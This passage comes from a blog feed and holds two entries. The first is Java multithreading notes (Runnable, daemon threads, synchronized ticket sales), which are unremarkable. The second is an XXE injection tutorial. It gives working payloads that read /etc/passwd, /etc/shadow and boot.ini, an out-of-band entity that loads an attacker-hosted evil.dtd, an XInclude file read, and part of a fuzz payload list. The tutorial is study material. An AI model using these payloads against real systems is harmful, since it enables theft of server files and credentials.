<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Runnable target=<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;子线程&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Thread t=<span class="keyword">new</span> Thread(target);</span><br><span class="line">        t.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>还可以进一步简化上面的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;子线程&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//jdk8后更简化</span></span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;子线程2&quot;</span>);</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="第三种多线程实现方案"><a href="#第三种多线程实现方案" class="headerlink" title="第三种多线程实现方案"></a>第三种多线程实现方案</h4><h5 id="利用Callable-FutureTask接口实现"><a href="#利用Callable-FutureTask接口实现" class="headerlink" title="利用Callable,FutureTask接口实现"></a>利用Callable,FutureTask接口实现</h5><p><img src="/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211224011547555.png" alt="image-20211224011547555"></p>
<h5 id="线程的常用方法"><a href="#线程的常用方法" class="headerlink" title="线程的常用方法"></a>线程的常用方法</h5><p>setName //设置线程名称,使之与参数name相同</p>
<p>getName  //返回该线程的名称</p>
<p>常用<code>Thread.currentThread().getName()</code></p>
<p>start //使该线程开始执行,java虚拟机底层调用该线程的start0方法</p>
<p>run //调用线程对象run方法</p>
<p>setPriority //更改线程优先级</p>
<p>getPriority //获取线程的优先级</p>
<p>sleep //在指定的毫秒数内让当前正在执行的线程休眠</p>
<p>interrupt //中断线程,但是并没有真正结束线程,往往是中断休眠sleep,转而执行catch中的语句</p>
<p>yield //是Thread的静态方法,直接<code>Thread.yield()</code>调用即可线程的礼让,让出cpu,让其他线程执行,但让出的时间不确定,所以也不一定礼让成功</p>
<p>join //线程的插队.插队的线程一旦插队成功,则肯定先执行完插入的线程所有的任务</p>
<p>案例:创建一个子线程,每隔1s输出hello,输出20次,主线程每隔一秒,输出hi,输出20次,要求:两个完成同时执行,当主线程输出5次后,就让子线程运行完毕,主线程再继续</p>
<h5 id="用户线程和守护线程"><a href="#用户线程和守护线程" class="headerlink" title="用户线程和守护线程"></a>用户线程和守护线程</h5><p>1.用户线程:也叫工作线程,当线程的任务执行完或通知方式结束</p>
<p>2.守护线程:一般是为工作线程服务的,当所有的用户线程结束,守护线程自动结束</p>
<p>3.常见的守护线程:垃圾回收机制</p>
<h5 id="如何把一个子线程设置为守护线程"><a href="#如何把一个子线程设置为守护线程" class="headerlink" title="如何把一个子线程设置为守护线程"></a>如何把一个子线程设置为守护线程</h5><p><code>myDaemonThread.setDaemon(true)</code>就可以把一个子线程设置为守护线程,主线程结束 它也结束</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">S8_5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        MyDaemonThread myDaemonThread=<span class="keyword">new</span> MyDaemonThread();</span><br><span class="line">        myDaemonThread.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">        myDaemonThread.start();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;主线程运行中&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyDaemonThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;子线程运行中&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主线程结束后,子线程也会结束</p>
<h5 id="线程的生命周期"><a href="#线程的生命周期" class="headerlink" title="线程的生命周期"></a>线程的生命周期</h5><img src="/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211225234147135.png" style="zoom: 80%;" />

<h4 id="线程同步机制"><a href="#线程同步机制" class="headerlink" title="线程同步机制"></a>线程同步机制</h4><p>在多线程编程中,一些敏感数据不允许被多个线程同时访问,此时就使用同步访问技术,保证数据在任何统一时刻,最多有一个线程访问,以保证数据的完整性</p>
<p>也可以这样理解:线程同步,即当有一个线程在对内存进行操作时,其他线程都不可以对这个内存地址进行操作,知道该线程完成操作,其他线程才能对该内存地址进行操作</p>
<h5 id="同步具体方法"><a href="#同步具体方法" class="headerlink" title="同步具体方法"></a>同步具体方法</h5><p>1.同步代码块</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">synchronized</span>(对象)&#123;<span class="comment">//得到对象的锁,才能操作同步代码</span></span><br><span class="line">	<span class="comment">//需要被同步的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.synchronized还可以放在方法声明中,表示整个方法为同步方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">m</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">	<span class="comment">//需要被同步的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.如何理解</p>
<p>就好像上厕所,A上厕所关上门(上锁),完事出来后(解锁),那么其他人就可以再使用厕所了</p>
<p>例子</p>
<p>之前的售票窗口程序,通过继承Runnable接口,虽然实现了票数的共享,但是售票顺序是乱的</p>
<p><a href="#sell">售票窗口程序</a></p>
<p>通过线程同步,就可以实现每次只卖一张票,也就是每次只允许一个线程访问tickies变量并执行,这样还可以防止超卖现象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">S8_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">         TicketWindow tw=<span class="keyword">new</span> TicketWindow();</span><br><span class="line">         <span class="keyword">new</span> Thread(tw,<span class="string">&quot;窗口1&quot;</span>).start();</span><br><span class="line">         <span class="keyword">new</span> Thread(tw,<span class="string">&quot;窗口2&quot;</span>).start();</span><br><span class="line">         <span class="keyword">new</span> Thread(tw,<span class="string">&quot;窗口3&quot;</span>).start();</span><br><span class="line">         <span class="keyword">new</span> Thread(tw,<span class="string">&quot;窗口4&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TicketWindow</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> tickies=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> loop=<span class="keyword">true</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(tickies&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                Thread th= Thread.currentThread();<span class="comment">//获取当前线程</span></span><br><span class="line">                String th_name=th.getName();<span class="comment">//获取线程名称</span></span><br><span class="line">                System.out.println(th_name+<span class="string">&quot;正在发售&quot;</span>+tickies--+<span class="string">&quot;张票&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                loop=<span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(loop)&#123;</span><br><span class="line">            sell();<span class="comment">//sell是一种同步方法</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由运行结果可知,票按照tickies大小逐次递减卖出,就是不知道为啥,每次只有一到两个线程能抢到cpu资源并且执行</p>
<p><img src="/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211226000540093.png" alt="image-20211226000540093"></p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title>xxe</title>
    <url>/2021/12/24/xxe/</url>
    <content><![CDATA[<h2 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h2><p>xxe全程XML External Entity Injection即xml外部实体注入漏洞,XXE漏洞发生在<strong>应用程序解析XML输入时,没有禁止外部实体的加载</strong>,导致可能加载恶意外部文件,造成文件读取,命令执行,内网探测…</p>
<h4 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h4><p>Document Type Definition 文档类型定义</p>
<h5 id="DTD示例"><a href="#DTD示例" class="headerlink" title="DTD示例"></a>DTD示例</h5><p><code>&lt;!ELEMENT 元素名 类型&gt;</code></p>
<p>文件名xxe.dtd</p>
<p>ELEMENT大概作用是定义标签元素的类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT 班级 (学生+)&gt;</span><br><span class="line">&lt;!ELEMENT 学生 (名字,年龄,介绍)&gt;</span><br><span class="line">&lt;!ELEMENT 名字 (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT 年龄 (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT 介绍 (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>

<h5 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h5><p>PCDATA 的意思是被解析的字符数据（parsed character data）。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p>
<h5 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h5><p>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本。</p>
<h5 id="XML示例"><a href="#XML示例" class="headerlink" title="XML示例"></a>XML示例</h5><p>班级为根元素</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 班级 <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;xxe.dtd&quot;</span>&gt;</span></span><br><span class="line">&lt;班级&gt;</span><br><span class="line">	&lt;学生&gt;</span><br><span class="line">        &lt;名字&gt;张三&lt;/名字&gt;</span><br><span class="line">        &lt;年龄&gt;19&lt;/年龄&gt;</span><br><span class="line">        &lt;介绍&gt;好孩子&lt;/介绍&gt;</span><br><span class="line">    &lt;/学生&gt;</span><br><span class="line">    &lt;学生&gt;</span><br><span class="line">        &lt;名字&gt;小明&lt;/名字&gt;</span><br><span class="line">        &lt;年龄&gt;21&lt;/年龄&gt;</span><br><span class="line">        &lt;介绍&gt;学习认真&lt;/介绍&gt;</span><br><span class="line">    &lt;/学生&gt;</span><br><span class="line">&lt;/班级&gt;</span><br></pre></td></tr></table></figure>

<p>内部DTD</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 班级 [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT 班级 (学生+)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT 学生 (名字,年龄,介绍)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT 名字 (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT 年龄 (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT 介绍 (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">&lt;班级&gt;</span><br><span class="line">	&lt;学生&gt;</span><br><span class="line">        &lt;名字&gt;张三&lt;/名字&gt;</span><br><span class="line">        &lt;年龄&gt;19&lt;/年龄&gt;</span><br><span class="line">        &lt;介绍&gt;好孩子&lt;/介绍&gt;</span><br><span class="line">    &lt;/学生&gt;</span><br><span class="line">    &lt;学生&gt;</span><br><span class="line">        &lt;名字&gt;小明&lt;/名字&gt;</span><br><span class="line">        &lt;年龄&gt;21&lt;/年龄&gt;</span><br><span class="line">        &lt;介绍&gt;学习认真&lt;/介绍&gt;</span><br><span class="line">    &lt;/学生&gt;</span><br><span class="line">&lt;/班级&gt;</span><br></pre></td></tr></table></figure>



<h4 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h4><h5 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">neo</span>[</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">neo</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-string">&quot;hello&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">neo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">neo</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>会在页面回显hello</p>
<h5 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">neo</span>[</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">neo</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;文档URL&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">neo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">neo</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h5><p>参数实体只能在DTD文档中定义,DTD中引用</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">neo</span>[</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">neo</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxx.xxx.xxx/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%xxe;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">neo</span>&gt;</span><span class="symbol">&amp;evil;</span><span class="tag">&lt;/<span class="name">neo</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><h5 id="直接通过DTD外部实体声明"><a href="#直接通过DTD外部实体声明" class="headerlink" title="直接通过DTD外部实体声明"></a>直接通过DTD外部实体声明</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">neo</span>[</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="通过DTD文档引入外部DTD文档-再引入外部实体声明"><a href="#通过DTD文档引入外部DTD文档-再引入外部实体声明" class="headerlink" title="通过DTD文档引入外部DTD文档,再引入外部实体声明"></a>通过DTD文档引入外部DTD文档,再引入外部实体声明</h5><p>xml内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">neo</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;dtd文档url&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>dtd内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="通过参数实体-OOB"><a href="#通过参数实体-OOB" class="headerlink" title="通过参数实体(OOB)"></a>通过参数实体(OOB)</h5><p>先写一个外部实体声明,然后引用在攻击者服务器上面的外部实体声明</p>
<p>xml内容</p>
<h5 id="作用"><a href="#作用" class="headerlink" title="%作用"></a>%作用</h5><p>就我的理解,百分号可以类比于一段命令,它可以在dtd中被定义和执行,它在实例中相当于变量,在xml中相当于命令?</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY %d <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxx.xxx/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>dtd文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="协议支持"><a href="#协议支持" class="headerlink" title="协议支持"></a>协议支持</h4><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220108211411539.png" alt="image-20220108211411539"></p>
<h5 id="XInclude-命名空间"><a href="#XInclude-命名空间" class="headerlink" title="XInclude(命名空间)"></a>XInclude(命名空间)</h5><p>导入外部xml文档，类似于php的include，将外部定义的dtd引入当前文件，因为引入外部实体具有局限性，所以使用xinclude来引入</p>
<p> 本质是使用<code>http://www.w3.org/2003/XInclude</code> 命名空间中的两个元素，即 include 和 fallback。常用的命名空间前缀是“xi”（但可以根据喜好自由使用任何前缀）</p>
<p>首先使用xmls来定义命名空间为xi</p>
<p>然后接下来就可以使用定义好的xi命名空间中的include来包含文件了,parse可以将文件属性进行转换,转换成text进行包含输出</p>
<p>一个例子</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">foo</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.we.org/2003/XInclude&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;</span>//    单标签别忘了反斜杠</span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="SVG-矢量图"><a href="#SVG-矢量图" class="headerlink" title="SVG(矢量图)"></a>SVG(矢量图)</h5><p>使用Apache中的Batik库解析矢量图,可以解析xml文档</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220109171338198.png" alt="image-20220109171338198"></p>
<h5 id="对大佬写的xxe-fuzz的阅读理解"><a href="#对大佬写的xxe-fuzz的阅读理解" class="headerlink" title="对大佬写的xxe fuzz的阅读理解"></a>对大佬写的xxe fuzz的阅读理解</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">foo</span> <span class="meta-string">&quot;aaaaaa&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">foo</span> <span class="meta-string">&quot;aaaaaa&quot;</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;foo;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">foo</span> <span class="meta-string">&quot;aaaaaa&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">foo</span> <span class="meta-string">&quot;aaaaaa&quot;</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;foo;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/issue&quot;</span> &gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/issue&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/shadow&quot;</span> &gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/shadow&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/boot.ini&quot;</span> &gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span><span class="meta">&lt;!ENTITY 